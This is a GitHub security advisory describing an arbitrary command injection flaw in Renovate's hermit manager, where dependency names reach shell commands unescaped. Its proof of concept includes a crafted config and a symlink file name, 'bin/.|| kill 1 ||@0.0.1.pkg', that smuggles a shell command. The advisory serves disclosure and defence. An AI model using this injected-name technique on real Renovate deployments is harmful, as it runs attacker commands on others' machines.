{
  "schema_version": "1.4.0",
  "id": "GHSA-36j9-mx87-2cff",
  "modified": "2026-01-13T20:28:41Z",
  "published": "2026-01-13T20:28:41Z",
  "aliases": [],
  "summary": "Renovate vulnerable to arbitrary command injection via hermit manager and maliciously named dependencies",
  "details": "### Summary\nThe user-provided string `depName` in the `hermit` manager is appended to the `./hermit install` and `./hermit uninstall` commands without proper sanitization.\n\n### Details\nAdversaries can provide a maliciously named hermit dependency in conjunctions with a tweaked Renovate configuration file to trick Renovate to execute arbitrary code.\nAll values added to the `packagesToInstall` and `packagesToUninstall` variables in [lib/modules/manager/hermit/artifacts.ts](https://github.com/renovatebot/renovate/blob/41e8b99f86a6e2a56f80f7aa1a08a59d76f2358c/lib/modules/manager/hermit/artifacts.ts) are not being escaped using the `quote` function from the `shlex` package.\nThis lack of proper sanitization for installing packages has been present in the product since the introduction of the hermit manager in version 32.135.0 (https://github.com/renovatebot/renovate/commit/b696abb3c2741508fbb4029f39153140a3722e1e), released on July 30 of 2022.\nIn version 37.199.1 (https://github.com/renovatebot/renovate/commit/eaec10d7c8afadbdd783ac47bd2adbfab444d6df) some use of the `quote` function from the `shlex` package was added, but not in a way that usefully prevented this arbitrary code injection vulnerability.\nWhen support for replacements was introduced with version 37.214.4 (https://github.com/renovatebot/renovate/commit/41e8b99f86a6e2a56f80f7aa1a08a59d76f2358c), the same faulty approach was replicated for uninstalling packages.\n\n### PoC\n1. Create a git repo with the following content:\n\n`renovate.json5`:\n\n```json5\n{\n  $schema: \"https://docs.renovatebot.com/renovate-schema.json\",\n  customDatasources: {\n    always: {\n      defaultRegistryUrlTemplate: \"https://docs.renovatebot.com/search/search_index.json\",\n      transformTemplates: ['{\"releases\":[{\"version\":\"99999.0.0\"}]}'],\n    },\n  },\n  packageRules: [\n    {\n      // Target of the day\n      matchManagers: [\"hermit\"],\n      // Trick the manager in believing there's a new version\n      overrideDatasource: \"custom.always\",\n    },\n  ],\n}\n\n```\n\n\n`bin/hermit`:\n\n```bash\n#!/bin/bash\n#\n# THIS FILE IS GENERATED; DO NOT MODIFY\n\nset -eo pipefail\n\nexport HERMIT_USER_HOME=~\n\nif [ -z \"${HERMIT_STATE_DIR}\" ]; then\n  case \"$(uname -s)\" in\n  Darwin)\n    export HERMIT_STATE_DIR=\"${HERMIT_USER_HOME}/Library/Caches/hermit\"\n    ;;\n  Linux)\n    export HERMIT_STATE_DIR=\"${XDG_CACHE_HOME:-${HERMIT_USER_HOME}/.cache}/hermit\"\n    ;;\n  esac\nfi\n\nexport HERMIT_DIST_URL=\"${HERMIT_DIST_URL:-https://github.com/cashapp/hermit/releases/download/stable}\"\nHERMIT_CHANNEL=\"$(basename \"${HERMIT_DIST_URL}\")\"\nexport HERMIT_CHANNEL\nexport HERMIT_EXE=${HERMIT_EXE:-${HERMIT_STATE_DIR}/pkg/hermit@${HERMIT_CHANNEL}/hermit}\n\nif [ ! -x \"${HERMIT_EXE}\" ]; then\n  echo \"Bootstrapping ${HERMIT_EXE} from ${HERMIT_DIST_URL}\" 1>&2\n  INSTALL_SCRIPT=\"$(mktemp)\"\n  # This value must match that of the install script\n  INSTALL_SCRIPT_SHA256=\"09ed936378857886fd4a7a4878c0f0c7e3d839883f39ca8b4f2f242e3126e1c6\"\n  if [ \"${INSTALL_SCRIPT_SHA256}\" = \"BYPASS\" ]; then\n    curl -fsSL \"${HERMIT_DIST_URL}/install.sh\" -o \"${INSTALL_SCRIPT}\"\n  else\n    # Install script is versioned by its sha256sum value\n    curl -fsSL \"${HERMIT_DIST_URL}/install-${INSTALL_SCRIPT_SHA256}.sh\" -o \"${INSTALL_SCRIPT}\"\n    # Verify install script's sha256sum\n    openssl dgst -sha256 \"${INSTALL_SCRIPT}\" | \\\n      awk -v EXPECTED=\"$INSTALL_SCRIPT_SHA256\" \\\n      '$2!=EXPECTED {print \"Install script sha256 \" $2 \" does not match \" EXPECTED; exit 1}'\n  fi\n  /bin/bash \"${INSTALL_SCRIPT}\" 1>&2\nfi\n\nexec \"${HERMIT_EXE}\" --level=fatal exec \"$0\" -- \"$@\"\n\n```\n\n\n`bin/.|| kill 1 ||@0.0.1.pkg` (symlink):\n\nA symlink to `hermit`\n\n2. Run Renovate against the repo from a Docker container. Notice that the process terminates without reporting \"Repository finished\", because the ACI vulnerability allowed for execution of `kill 1`, terminating the root process of the container.\n\n> [!NOTE]\n> This specific proof of concept was made a lot simpler with the introduction of the `overrideDatasource` configuration since version 38.120.0 (https://github.com/renovatebot/renovate/commit/a70a6a376d31148e80be5a5c885ac33ff5ddb30c), released on October 12 of 2024, because it means that there is no more need for a proper response from an actual hermit-packages repository during resolution.\n\n### Impact\nTThis is a Arbitrary Command Injection vulnerability, allowing those with write access on repositories configured to be scanned by Renovate to cause the execution of commands of their choice on the machine that runs Renovate.",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
    }
  ],
  "affected": [
    {
      "package": {
        "ecosystem": "npm",
        "name": "renovate"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "32.135.0"
            },
            {
              "fixed": "40.33.0"
            }
          ]
        }
      ]
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/renovatebot/renovate/security/advisories/GHSA-36j9-mx87-2cff"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/renovatebot/renovate"
    }
  ],
  "database_specific": {
    "cwe_ids": [
      "CWE-77"
    ],
    "severity": "MODERATE",
    "github_reviewed": true,
    "github_reviewed_at": "2026-01-13T20:28:41Z",
    "nvd_published_at": null
  }
}